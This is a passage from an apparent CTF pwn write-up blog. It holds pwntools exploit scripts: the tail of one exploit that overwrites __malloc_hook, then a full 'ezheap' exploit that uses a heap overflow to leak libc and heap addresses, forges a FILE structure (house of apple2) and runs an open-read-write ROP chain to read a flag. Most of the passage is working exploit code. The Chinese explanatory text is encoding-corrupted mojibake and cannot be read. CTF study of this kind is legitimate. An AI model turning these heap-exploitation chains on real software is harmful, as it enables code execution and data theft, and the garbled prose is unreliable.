</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Please input the length of the diary content:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Please enter the diary content:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>welcome</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Hello, I&#39;m delighted to meet you. Please tell me your name.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pwn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1>#debug()</span>
</span></span><span class=line><span class=cl>    <span class=n>welcome</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;aaaa&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;b&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xE1\x0f\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span><span class=o>-</span><span class=mh>0x3c510a</span>
</span></span><span class=line><span class=cl>    <span class=n>leak_addr</span><span class=p>(</span><span class=s2>&#34;libc_addr&#34;</span><span class=p>,</span><span class=n>libc_addr</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc_hook</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x23</span>
</span></span><span class=line><span class=cl>    <span class=n>one</span> <span class=o>=</span> <span class=n>libc_addr</span><span class=o>+</span><span class=mh>0xf03a4</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>malloc_hook</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x60</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mh>0x13</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>one</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Please input the length of the diary content:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pwn</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=ezheap>ezheap<a hidden class=anchor aria-hidden=true href=#ezheap>#</a></h2><p>æ€ä¹ˆæ˜¯ç”¨seccompå¼€çš„æ²™ç®±å•Šï¼Œä¸‹æ¬¡è®°å¾—ç”¨prctlæ‰ä¸ä¼šæœ‰è¿™ä¹ˆå¤šé‡Šæ”¾çš„heapå†…å­˜ï¼Œæ¨èæ–‡ç« <a href=https://www.anquanke.com/post/id/208364#h2-2>seccompæ²™ç®±</a></p><p><img loading=lazy src=image1.png alt="heap memory"></p><h3 id=é¢˜ç›®ç®€ä»‹-2>é¢˜ç›®ç®€ä»‹<a hidden class=anchor aria-hidden=true href=#é¢˜ç›®ç®€ä»‹-2>#</a></h3><p>libc: 2.35</p><p>exploit point: heap overflow</p><p>å€ŸåŠ©ç©ºé—´ä¸­ç°å­˜çš„heapï¼Œæ³„éœ²å‡ºlibcå’Œheapåœ°å€ï¼Œç„¶åæ‰“house of apple2</p><h3 id=æ¼æ´åˆ©ç”¨>æ¼æ´åˆ©ç”¨<a hidden class=anchor aria-hidden=true href=#æ¼æ´åˆ©ç”¨>#</a></h3><p>å…ˆåˆ†é…ä¸€ä¸ªsize<code>0x60</code>çš„æŠŠtcache binæ¶ˆè€—ç©ºï¼Œç„¶åä»unsorted binä¸Šåˆ†å‰²ä¸€ä¸ªsize<code>0x60</code>çš„heapï¼Œç”¨æ¥æ³„æ¼libc
<img loading=lazy src=image2.png alt="heap layout"></p><p>åˆ†é…åˆ°small binä¸Šé¢<code>0x40</code>sizeçš„heapï¼Œæ³„æ¼å‡ºå †å—åœ°å€
<img loading=lazy src=image3.png alt="heap layout"></p><h3 id=exp-1>exp<a hidden class=anchor aria-hidden=true href=#exp-1>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>binary_path</span> <span class=o>=</span> <span class=s1>&#39;./EzHeap&#39;</span>
</span></span><span class=line><span class=cl><span class=n>libc_path</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>binary_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libc_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>argv</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[</span><span class=n>binary_path</span><span class=p>,</span> <span class=n>argv</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1>#p=remote(&#39;8.147.129.121&#39;,15268)</span>
</span></span><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span><span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>-----&gt;&#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>main_arena_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=c1>#global_max_fast_offset = 0x3c67f8</span>
</span></span><span class=line><span class=cl><span class=c1>#free_hook_offset = libc.symbols[&#34;__free_hook&#34;]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=s2>&#34;b _IO_wdoallocbuf&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cmd</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;choice &gt;&gt; &#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;size:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;content:&#34;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx_</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;idx&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx_</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;idx&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;size:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;content:&#34;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;idx&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;content:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pwn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x50</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1>#0</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x50</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1>#1</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x60</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>8</span><span class=o>*</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>8</span><span class=o>*</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_addr</span>  <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x21ace0</span>
</span></span><span class=line><span class=cl>    <span class=n>leak_addr</span><span class=p>(</span><span class=s2>&#34;libc_addr&#34;</span><span class=p>,</span><span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x60</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>8</span><span class=o>*</span><span class=mi>11</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x90</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1>#2-8</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1>#9</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1>#10</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span><span class=mh>0x41</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>8</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>8</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_base</span>  <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span><span class=o>-</span> <span class=mh>0x61</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span><span class=mh>0x48</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>8</span><span class=o>*</span><span class=mi>6</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xf1</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_base</span> <span class=o>+=</span> <span class=mh>0x1590</span> 
</span></span><span class=line><span class=cl>    <span class=c1>#debug()</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdi_ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mh>0x000000000002a3e5</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi_ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mh>0x000000000002be51</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rsi_r15_ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mh>0x000000000002a3e3</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rdx_r12_ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mh>0x000000000011f2e7</span>
</span></span><span class=line><span class=cl>    <span class=n>pop_rax_ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mh>0x0000000000045eb0</span>
</span></span><span class=line><span class=cl>    <span class=n>magic_gadget</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mi>26</span> <span class=o>+</span> <span class=mh>0x16a050</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    mov    rbp,QWORD PTR [rdi+0x48]
</span></span></span><span class=line><span class=cl><span class=s1>    mov    rax,QWORD PTR [rbp+0x18]
</span></span></span><span class=line><span class=cl><span class=s1>    lea    r13,[rbp+0x10]
</span></span></span><span class=line><span class=cl><span class=s1>    mov    DWORD PTR [rbp+0x10],0x0
</span></span></span><span class=line><span class=cl><span class=s1>    mov    rdi,r13
</span></span></span><span class=line><span class=cl><span class=s1>    call   QWORD PTR [rax+0x28]
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>leave_ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mh>0x000000000004da83</span>
</span></span><span class=line><span class=cl>    <span class=n>syscall_ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>+</span> <span class=mh>0x0000000000029139</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_IO_addr</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span>  <span class=mh>0x180</span>
</span></span><span class=line><span class=cl>    <span class=n>leak_addr</span><span class=p>(</span><span class=s2>&#34;fake_IO_addr&#34;</span><span class=p>,</span><span class=n>fake_IO_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rop_address</span> <span class=o>=</span> <span class=n>fake_IO_addr</span> <span class=o>+</span> <span class=mh>0xe0</span> <span class=o>+</span> <span class=mh>0xe8</span> <span class=o>+</span> <span class=mh>0x70</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>=</span>  <span class=sa>b</span><span class=s1>&#39;./flag</span><span class=se>\x00\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_r15_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_IO_addr</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_address</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=c1>#orw_rop += p64(pop_rsi_ret) + p64(0)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rax_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall_ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_address</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_r12_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span><span class=o>+</span><span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_address</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_r12_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x50</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span><span class=o>+</span><span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>+</span> <span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop_address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_IO_addr</span> <span class=o>+</span> <span class=mh>0xe0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xc8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_wfile_jumps&#39;</span><span class=p>]</span><span class=o>+</span><span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xd0</span> <span class=o>+</span> <span class=mh>0xe0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_IO_addr</span> <span class=o>+</span> <span class=mh>0xe0</span> <span class=o>+</span> <span class=mh>0xe8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xd0</span> <span class=o>+</span> <span class=mh>0xe8</span> <span class=o>+</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>magic_gadget</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=n>orw_rop</span>
</span></span><span class=line><span class=cl>    <span class=n>leak_addr</span><span class=p>(</span><span class=s2>&#34;heap_base&#34;</span><span class=p>,</span><span class=n>heap_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=p>)</span> <span class=c1># 11</span>
